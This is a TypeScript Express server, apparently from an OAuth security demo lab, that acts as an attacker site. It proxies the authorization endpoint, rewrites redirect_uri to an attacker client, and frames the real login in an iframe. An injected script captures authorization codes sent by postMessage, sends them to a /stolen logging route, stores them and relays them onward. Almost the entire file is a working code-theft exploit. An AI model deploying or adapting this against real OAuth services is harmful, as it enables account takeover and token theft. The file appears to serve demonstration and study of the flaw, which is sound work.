import express from "express";
import path from "path";

const app = express();

app.get("/", (req, res) => {
    res.sendFile(path.join(process.cwd(), "./pages/attackerPage.html"));
});


app.get("/2", (req, res) => {
    res.sendFile(path.join(process.cwd(), "./pages/attackerPage2.html"));
});


app.get("/oauth/authorize", (req, res) => {
    console.log("🎯 attacker /oauth/authorize hit");

    const params = new URLSearchParams({
        ...(req.query as Record<string, string>),
        redirect_uri: "http://oauthclientattacker:3003",
        response_mode: "web_message",
    });

    const oauthUrl = `http://oauthserver:3001/oauth/authorize?${params}`;

    res.send(`
        <!DOCTYPE html>
        <html>
        <head><style>
            * { margin: 0; padding: 0; }
            body { background: #0d1117; }
            iframe { width: 100%; height: 100vh; border: none; }
        </style></head>
        <body>
            <iframe src=${JSON.stringify(oauthUrl)}></iframe>
            <script>
window.addEventListener("message", (e) => {
    const code = e.data?.code;
    if (!code) return;

    console.log("💀 code stolen:", code);

    // log to attacker server
    fetch("/stolen?code=" + code);

    // forward to legitimate client
    if (window.opener) {
        window.opener.postMessage({ code }, "http://oauthclient:3000");
    }
            localStorage.setItem("stolenCode", code);
          window.location.href = "http://oauthclientattacker:3003/2?mode=web_message";

});
            </script>
        </body>
        </html>
    `);
});

// log stolen code server-side
app.get("/stolen", (req, res) => {
    console.log("💀 STOLEN CODE:", req.query.code);
    res.sendStatus(200);
});


app.get("/showcase", (req, res) => {
    res.sendFile(path.join(process.cwd(), "./pages/oauth_visualizer.html"));
});

app.get("/showcase2", (req, res) => {
    res.sendFile(path.join(process.cwd(), "./pages/oauth_visualizer2.html"));
});

app.listen(3003, () => console.log("💀 attacker running on :3003"));
